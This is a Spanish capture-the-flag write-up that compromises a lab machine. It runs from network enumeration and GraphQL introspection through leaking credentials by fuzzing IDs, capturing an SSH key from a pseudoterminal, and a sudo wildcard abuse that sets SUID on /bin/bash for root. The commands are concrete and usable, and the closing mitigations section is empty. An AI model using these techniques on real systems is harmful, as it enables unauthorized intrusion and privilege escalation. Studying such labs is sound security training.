-------

# Enumeración

Comenzamos con un escaneo para identificar la máquina vulnerable, esto con ayuda de la herramienta `arp-scan`:

```bash
arp-scan -I ens33 --localnet --ignoredups
```

![[Pasted image 20260622151802.png]]

En esta ocasión la máquina víctima será la `192.168.74.130` y mediante el comando `ping` vamos a intentar identificar qué tipo de sistema operativo está operando:

```bash
ping -c 1 192.168.74.130
```

![[Pasted image 20260622152329.png]]

Como podemos observar, tenemos un `ttl=64`, lo que significa que posiblemente nos encontremos frente a un sistema con base Unix.

Ya con lo anterior en mente, podemos proceder a realizar un escaneo de puertos general con ayuda de `nmap`:

```bash
nmap -p- --open -sS --min-rate 5000 -n -v -Pn 192.168.74.130 -oG allPorts
```

![[Pasted image 20260622152655.png]]

En el resultado observamos los puertos `22 y 80` abiertos, por lo que vamos a realizar un escaneo mucho más agresivo sobre estos dos puertos de igual forma con ayuda de `nmap`:

```bash
nmap -p22,80 -sVC 192.168.74.130 -oN target
```

![[Pasted image 20260622152847.png]]

Listo, podemos observar entonces el servicio de SSH corriendo y de igual forma el servicio de http, es decir, contamos con alguna web corriendo y al parecer utiliza NodeJS.

Lo primero que voy a hacer es analizar la web con ayuda de la herramienta de `Whatweb`:

```bash
whatweb http://192.168.74.130
```

![[Pasted image 20260622153059.png]]

No logramos obtener información muy relevante, así que procedemos a ingresar a la web con el objetivo de analizar su contenido:

![[Pasted image 20260622153307.png]]

Podemos ver que es una web sencilla en realidad, donde, a partir de un ID, podemos obtener un personaje. Con esto en mente podemos analizar el código fuente en búsqueda de alguna pista:

![[Pasted image 20260622153448.png]]

En el código fuente tiene un script que, al parecer, es el encargado de enviar la petición sobre un personaje a partir de su ID y luego insertar dicha información en el HTML. Además, logro observar que esta petición se realiza a la ruta `/graphql`, así que claramente vamos a tener una API de tipo `GraphQL` funcionando.

Lo que vamos a realizar es capturar con ayuda del Burp Suite una petición para analizar cómo se tramita la información:

![[Pasted image 20260622153937.png]]

Podemos observar claramente por la estructura que estamos interactuando con una API de tipo GraphQL, por lo tanto, vamos a intentar realizar un introspection:

![[Pasted image 20260622154048.png]]

Observando la respuesta podemos ver que fue exitoso. Lo primero que voy a hacer es representarlo de una forma más gráfica con ayuda de GraphQL Voyager:

![[Pasted image 20260622154313.png]]

Perfecto, esta estructura nos indica que contamos con un campo `users`, el cual cuenta con `username` y `password`.

Lo que ahora voy a utilizar es de igual forma una utilidad de Burp Suite una vez tenemos la respuesta del introspection, y es la de `Save GraphQL queries to site map` donde vamos a obtener peticiones ya armadas a partir del introspection:

![[Pasted image 20260622154537.png]]

Bueno, vamos a observar lo siguiente:

![[Pasted image 20260622154757.png]]

Tenemos 3 peticiones armadas, donde vamos a fijarnos en la que al parecer podemos filtrar un `username` y `password` a partir de su ID, por lo que vamos a enviarla a repeater para usarla:

![[Pasted image 20260622155005.png]]

# Explotación

Como podemos observar, es válida, y no tendría sentido el usar o dejar un campo `user` si no vamos a tener nada, así que aprovecharé la situación para desarrollar un script básico en Python 3 que nos permita buscar por algún ID válido.

El script lo podemos encontrar en el link del [GitHub](https://github.com/danystarrkk/Hacknig-Tools/tree/main/Tools/Fuzzing%20ID%20(Flossy)).

El script, como podemos observar, realiza varias peticiones intentando encontrar un ID válido, de igual forma lo que se hizo fue simplificar la petición para una mejor adaptación en el código. En Burp Suite la petición quedaría de la siguiente manera:

![[Pasted image 20260623080441.png]]

El script lo ejecutamos de la siguiente manera:

```bash
python3 fuzzin.py -u http://192.168.74.130/graphql -r 1-100
```

![[Pasted image 20260623211805.png]]

Listo, al parecer sí teníamos un ID válido que sería el número 9, y como vemos, tenemos un usuario y una contraseña, pero si recordamos la web no tiene ningún panel de login.

Si recordamos los puertos abiertos, tenemos el puerto 22 corriendo SSH, lo que significa que podemos intentar conectarnos con esas credenciales de la siguiente manera:

```bash
ssh malo@192.168.74.130
```

![[Pasted image 20260623212305.png]]

Ya tenemos lo que es un zsh como el usuario malo por el momento.

# Escalada de Privilegios

Ya dentro de la máquina, vamos a intentar buscar por más usuarios aprovechando el archivo `/etc/passwd` de la siguiente manera:

```bash
cat /etc/passwd | grep ".*sh$"
```

![[Pasted image 20260623213947.png]]

Como podemos observar, tenemos un usuario extra llamado `sophie`.

Si nos ponemos a investigar un poco dentro de su directorio nos vamos a encontrar con un archivo llamado `SSHKeySync` el cual vamos a analizar:

![[Pasted image 20260623214349.png]]

Como podemos observar, en esta captura lo que tenemos es:
1. Definimos el usuario, la ruta de una clave privada para el usuario que se use y `admin_tty` guarda en realidad la ruta de una pseudoterminal. Recordemos que estas se generan para intentar emular las TTY, donde estas trabajan directamente con el hardware pero, al realizar conexiones remotas, no se tiene el hardware directamente, así que se genera una pseudoterminal para simular la TTY.
2. Lo que vemos en el siguiente paso es que al cumplirse una serie de requisitos, estamos enviando el contenido de la clave privada a la pseudoterminal con el identificador 24.
3. Por último, vemos que el usuario que se definió es el de `sophie`, por lo tanto, en realidad estamos enviando ya la clave privada del usuario `sophie` a una pseudoterminal con el identificador 24.

Ahora el problema es que actualmente no tenemos el permiso para ejecutar este script, y además, no tenemos idea de si se está ejecutando, así que voy a crear el siguiente script simple que me ayudará a ver, de forma algo superficial, si algún comando se ejecuta en el sistema:

```bash
#!/bin/bash

old_command="$(ps -eo command)"

while true; do
  new_command="$(ps -eo command)"
  diff <(echo "$new_command") <(echo "$old_command") | grep -vE "command|kworker"
  old_command="$new_command"
done

```

![[Pasted image 20260624113408.png]]

Con este pequeño script básico vamos a poder observar los comandos que se están ejecutando en el sistema a niveles irregulares de tiempo, así que vamos a dejarlo corriendo un momento.

![[Pasted image 20260624113325.png]]

Luego de un momento logramos observar cómo al parecer se ejecuta un `sleep 1m`. Si nosotros recordamos, el script de `SSHKeySync` ejecuta esto al final de sus sentencias, por lo tanto, el script está ejecutándose cada cierto tiempo. Conociendo la teoría de pseudoterminales, donde se generará una nueva por cada conexión, en este caso por SSH, vamos a intentar llegar al identificador de la pseudoterminal `24` y para esto primero vamos a generar un par de claves para poder usarlas al momento de la conexión sin la necesidad de contraseña de la siguiente manera:

```bash
ssh-keygen
```

![[Pasted image 20260624113925.png]]

Por último, tenemos que cambiar el nombre de la clave pública dentro de la máquina víctima, es decir:

```bash
mv id_rsa.pub authorized_keys
```

 Ahora, lo que vamos a hacer es copiarla y pasarla a nuestra máquina atacante y darle los permisos `600`:

![[Pasted image 20260624114436.png]]

Teniendo la clave lista, podemos intentar realizar nuevamente una conexión:

```bash
ssh malo@192.168.74.130 -i id_rsa
```

![[Pasted image 20260624162447.png]]

Perfecto, ahora si revisamos el valor que tiene la tty:

![[Pasted image 20260624162515.png]]

Como observamos, tenemos el valor de 1, pero hacerlo de forma manual, es decir, generar estas conexiones de forma continua, nos llevará tiempo y es un trabajo tedioso, por lo que vamos a automatizar la conexión de la siguiente manera:

```bash
for i in {1..23};do ssh -tt 0 "sleep 1000 &"; done
```

![[Pasted image 20260624163500.png]]

Ya con esto, procedemos a conectarnos con `ssh 0`:

![[Pasted image 20260624163538.png]]

Listo, ya nos encontramos en la pseudoterminal 24, por lo tanto es cuestión de esperar y veremos lo siguiente:

![[Pasted image 20260624163617.png]]

Ya con esto, nos copiamos esta clave a un archivo de igual forma y le damos los permisos correspondientes:

![[Pasted image 20260624164328.png]]

Ya con la clave lista, vamos a intentar conectarnos de la siguiente manera:

```bash
ssh sophie@192.168.74.130 -i sophie
```

![[Pasted image 20260624164227.png]]


Perfecto, en este punto ya podemos ver la flag de usuario:

![[Pasted image 20260624171203.png]]

Ya en este punto, vamos a volver a revisar la configuración del comando sudo mediante `sudo -l`:

![[Pasted image 20260624171326.png]]

Como observamos, podemos ejecutar el archivo `/home/sophie/network*`, pero esto tiene un problema y es el cómo usa la wildcard. Esto le indica al sistema que ejecute todo archivo que tenga como nombre `network` seguido de cualquier cosa, así que por qué no intentar crear un archivo de nombre `networks` con  s al final y, de contenido, intentemos asignarle permisos SUID a la  `bash` de la siguiente manera:

```bash
chmod +s /bin/bash
```

![[Pasted image 20260624171708.png]]

Ahora, con este archivo listo vamos a darle permisos de ejecución `chmod +x networks` y luego a ejecutarlo de la siguiente manera:

```bash
sudo /home/sophie/networks
```

![[Pasted image 20260624171921.png]]

Si revisamos los permisos de la `bash`, veamos si ya tenemos los SUID aplicados:

![[Pasted image 20260624172009.png]]

Listo, ya tenemos permisos SUID, así que vamos a escalar de privilegios con `/bin/bash -p`:

![[Pasted image 20260624172051.png]]

Ya estamos como `root` y podemos verificar la flag:

![[Pasted image 20260624172137.png]]

Lab Terminado.

![[Pasted image 20260624172312.png]]


# Mitigaciones